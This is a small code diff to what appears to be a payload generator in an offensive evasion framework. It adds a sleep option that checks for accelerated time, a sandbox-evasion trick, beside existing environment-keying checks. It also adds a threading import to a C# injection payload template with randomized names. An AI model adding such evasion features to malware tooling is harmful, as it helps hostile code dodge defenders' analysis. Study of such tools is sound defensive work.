@@ -44,7 +44,8 @@ class PayloadModule:
                                     "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                     "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                     "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-                                    "USERNAME"       : ["X", "Optional: The required user account"]
+                                    "USERNAME"       : ["X", "Optional: The required user account"],
+                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                 }
 
 
@@ -54,7 +55,7 @@ class PayloadModule:
         getDataName = helpers.randomString()
         injectName = helpers.randomString()
 
-        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
+        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading;\n"
         payload_code += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())
 
         hostName = helpers.randomString()
